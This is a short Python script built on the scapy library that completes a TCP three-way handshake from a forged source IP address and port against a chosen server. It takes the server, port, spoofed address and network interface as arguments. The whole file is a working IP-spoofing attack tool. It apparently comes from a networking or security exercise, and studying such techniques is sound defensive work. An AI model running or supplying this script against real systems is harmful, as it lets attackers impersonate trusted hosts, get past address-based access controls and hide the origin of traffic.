#!/usr/local/bin/python

'Usage: python3 {:s} <server> <port> <spoofed_ip> <spoofed_port> <iface>'

import sys
from scapy.all import *

def main():
    if len(sys.argv) != 6:
        print('{:s}'.format(__doc__.format(sys.argv[0])))
        sys.exit()

    destination_ip = sys.argv[1]
    destination_port = int(sys.argv[2])
    spoofed_ip = sys.argv[3]
    spoofed_port = int(sys.argv[4])
    interface = sys.argv[5]

    # SYN, SYNACK
    ip=IP(src=spoofed_ip,dst=destination_ip)
    SYN=TCP(sport=spoofed_port,dport=destination_port,flags='S',seq=1000)
    SYNACK=srp1(Ether()/ip/SYN, iface=interface) # Send and receive packets at layer 2 and return only the first answer

    # ACK
    ACK=TCP(sport=spoofed_port, dport=destination_port, flags='A', seq=SYN.seq + 1, ack=SYNACK.seq + 1)
    sendp(Ether()/ip/ACK, iface=interface) # Send packets at layer 2
   
if __name__ == '__main__':
    main()